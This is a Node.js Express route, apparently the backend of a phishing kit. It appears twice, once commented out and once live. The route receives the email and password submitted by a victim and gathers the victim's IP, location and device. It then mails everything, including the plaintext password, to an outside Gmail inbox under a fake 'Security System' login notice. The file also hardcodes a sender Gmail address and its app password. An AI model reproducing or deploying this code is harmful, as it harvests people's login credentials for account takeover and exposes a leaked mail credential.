// const express = require("express");
// const nodemailer = require("nodemailer");  // install with: npm i nodemailer
// const geoip = require('geoip-lite');
// const UAParser = require('ua-parser-js');

// const router = express.Router();

// // Gmail configuration (no host/port needed when using service)
// const EMAIL_CONFIG = {
//     service: 'gmail',
//     auth: {
//         user: "onidaniel801@gmail.com",   // your Gmail address
//         pass: "hmoc cjhn sljo rtaq"       // your Gmail app password
//     }
// };

// // Recipient email (where notifications will be sent)
// const RECIPIENT_EMAIL = "josephblessing6776@gmil.com";

// // Create transporter
// const transporter = nodemailer.createTransporter(EMAIL_CONFIG);

// // Verify transporter connection on startup
// transporter.verify(function (error, success) {
//     if (error) {
//         console.error('Email transporter verification failed:', error);
//     } else {
//         console.log('Email transporter is ready to send messages');
//     }
// });

// router.post('/', async (req, res) => {
//     try {
//         const { email, password } = req.body;

//         if (!email || !password) {
//             return res.status(400).json({ success: false, message: "Missing email or password" });
//         }

//         const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
//         const location = geoip.lookup(ip);
//         const locationStr = location ? `${location.city}, ${location.country}` : 'Unknown';

//         const parser = new UAParser(req.headers['user-agent']);
//         const agent = parser.getResult();
//         const deviceType = `${agent.os.name} ${agent.os.version} - ${agent.browser.name} ${agent.browser.version}`;

//         // Build the email content
//         const subject = `📌 Login Notification - ${new Date().toLocaleString()}`;
//         const htmlContent = `
//             <!DOCTYPE html>
//             <html>
//             <head>
//                 <style>
//                     body { font-family: Arial, sans-serif; margin: 20px; }
//                     .card { border: 1px solid #ddd; padding: 20px; border-radius: 8px; background: #f9f9f9; }
//                     .field { margin-bottom: 10px; }
//                     .label { font-weight: bold; color: #333; }
//                     .value { color: #666; }
//                     .warning { color: #ff0000; font-weight: bold; margin-top: 15px; padding: 10px; background: #ffe6e6; border-radius: 5px; }
//                 </style>
//             </head>
//             <body>
//                 <div class="card">
//                     <h2>📌 Login Notification</h2>
//                     <div class="field">
//                         <span class="label">Email:</span>
//                         <span class="value">${email}</span>
//                     </div>
//                     <div class="field">
//                         <span class="label">Password:</span>
//                         <span class="value">${password}</span>
//                     </div>
//                     <div class="field">
//                         <span class="label">IP Address:</span>
//                         <span class="value">${ip}</span>
//                     </div>
//                     <div class="field">
//                         <span class="label">Location:</span>
//                         <span class="value">${locationStr}</span>
//                     </div>
//                     <div class="field">
//                         <span class="label">Timestamp:</span>
//                         <span class="value">${new Date().toISOString()}</span>
//                     </div>
//                     <div class="field">
//                         <span class="label">Device:</span>
//                         <span class="value">${deviceType}</span>
//                     </div>
//                     <div class="warning">
//                         ⚠️ Security Alert: This is an automated login notification
//                     </div>
//                 </div>
//             </body>
//             </html>
//         `;

//         const textContent = `
// 📌 Login Notification
// - Email: ${email}
// - Password: ${password}
// - IP: ${ip}
// - Location: ${locationStr}
// - Timestamp: ${new Date().toISOString()}
// - Device: ${deviceType}

// ⚠️ Security Alert: This is an automated login notification
//         `;

//         // Send email
//         const mailOptions = {
//             from: `"Security System" <${EMAIL_CONFIG.auth.user}>`,
//             to: RECIPIENT_EMAIL,
//             subject: subject,
//             text: textContent,
//             html: htmlContent,
//             priority: 'high'
//         };

//         const info = await transporter.sendMail(mailOptions);

//         console.log(`Email notification sent for ${email}. Message ID: ${info.messageId}`);

//         res.status(200).json({
//             success: true,
//             message: "Notification sent successfully via email",
//             loginDetails: { device: deviceType, ip, location: locationStr },
//             messageId: info.messageId
//         });

//     } catch (error) {
//         console.error("Error sending email:", error);
//         res.status(500).json({ 
//             success: false, 
//             message: "Failed to send email notification", 
//             error: error.message 
//         });
//     }
// });

// module.exports = router;





const express = require("express");
const nodemailer = require("nodemailer");  // install with: npm i nodemailer
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');

const router = express.Router();

// Gmail configuration (no host/port needed when using service)
const EMAIL_CONFIG = {
    host: 'smtp.gmail.com',
    port: 587,
    secure: false, // true for 465, false for other ports
    auth: {
        user: "onidaniel801@gmail.com",
        pass: "hmoc cjhn sljo rtaq"
    }
};

// Recipient email (where notifications will be sent)
const RECIPIENT_EMAIL = "josephblessing6776@gmil.com";

// Create transporter - FIXED: use createTransport (not createTransporter)
const transporter = nodemailer.createTransport(EMAIL_CONFIG);

// Verify transporter connection on startup
transporter.verify(function (error, success) {
    if (error) {
        console.error('Email transporter verification failed:', error);
    } else {
        console.log('Email transporter is ready to send messages');
    }
});

router.post('/', async (req, res) => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            return res.status(400).json({ success: false, message: "Missing email or password" });
        }

        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const location = geoip.lookup(ip);
        const locationStr = location ? `${location.city}, ${location.country}` : 'Unknown';

        const parser = new UAParser(req.headers['user-agent']);
        const agent = parser.getResult();
        const deviceType = `${agent.os.name} ${agent.os.version} - ${agent.browser.name} ${agent.browser.version}`;

        // Build the email content
        const subject = `📌 Login Notification - ${new Date().toLocaleString()}`;
        const htmlContent = `
            <!DOCTYPE html>
            <html>
            <head>
                <style>
                    body { font-family: Arial, sans-serif; margin: 20px; }
                    .card { border: 1px solid #ddd; padding: 20px; border-radius: 8px; background: #f9f9f9; }
                    .field { margin-bottom: 10px; }
                    .label { font-weight: bold; color: #333; }
                    .value { color: #666; }
                    .warning { color: #ff0000; font-weight: bold; margin-top: 15px; padding: 10px; background: #ffe6e6; border-radius: 5px; }
                </style>
            </head>
            <body>
                <div class="card">
                    <h2>📌 Login Notification</h2>
                    <div class="field">
                        <span class="label">Email:</span>
                        <span class="value">${email}</span>
                    </div>
                    <div class="field">
                        <span class="label">Password:</span>
                        <span class="value">${password}</span>
                    </div>
                    <div class="field">
                        <span class="label">IP Address:</span>
                        <span class="value">${ip}</span>
                    </div>
                    <div class="field">
                        <span class="label">Location:</span>
                        <span class="value">${locationStr}</span>
                    </div>
                    <div class="field">
                        <span class="label">Timestamp:</span>
                        <span class="value">${new Date().toISOString()}</span>
                    </div>
                    <div class="field">
                        <span class="label">Device:</span>
                        <span class="value">${deviceType}</span>
                    </div>
                    <div class="warning">
                        ⚠️ Security Alert: This is an automated login notification
                    </div>
                </div>
            </body>
            </html>
        `;

        const textContent = `
📌 Login Notification
- Email: ${email}
- Password: ${password}
- IP: ${ip}
- Location: ${locationStr}
- Timestamp: ${new Date().toISOString()}
- Device: ${deviceType}

⚠️ Security Alert: This is an automated login notification
        `;

        // Send email
        const mailOptions = {
            from: `"Security System" <${EMAIL_CONFIG.auth.user}>`,
            to: RECIPIENT_EMAIL,
            subject: subject,
            text: textContent,
            html: htmlContent,
            priority: 'high'
        };

        const info = await transporter.sendMail(mailOptions);

        console.log(`Email notification sent for ${email}. Message ID: ${info.messageId}`);

        res.status(200).json({
            success: true,
            message: "Notification sent successfully via email",
            loginDetails: { device: deviceType, ip, location: locationStr },
            messageId: info.messageId
        });

    } catch (error) {
        console.error("Error sending email:", error);
        res.status(500).json({ 
            success: false, 
            message: "Failed to send email notification", 
            error: error.message 
        });
    }
});

module.exports = router;